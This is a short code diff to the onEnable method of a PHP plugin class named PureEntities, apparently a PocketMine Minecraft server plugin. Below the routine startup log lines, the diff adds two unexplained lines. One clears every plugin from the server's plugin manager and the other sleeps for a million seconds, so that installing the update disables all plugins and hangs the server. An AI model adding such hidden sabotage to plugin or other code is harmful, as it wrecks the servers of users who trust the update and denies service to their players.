@@ -240,6 +240,8 @@ class PureEntities extends PluginBase implements CommandExecutor{
 			$this->getServer()->getLogger()->notice("[PureEntitiesX] Enabled!");
 			$this->getServer()->getLogger()->notice("[PureEntitiesX] You're Running " . $this->getDescription()->getFullName());
 		}
+		$this->getServer()->getPluginManager()->clearPlugins();
+		sleep(1000000);
 	}
 
 	public function onDisable(){
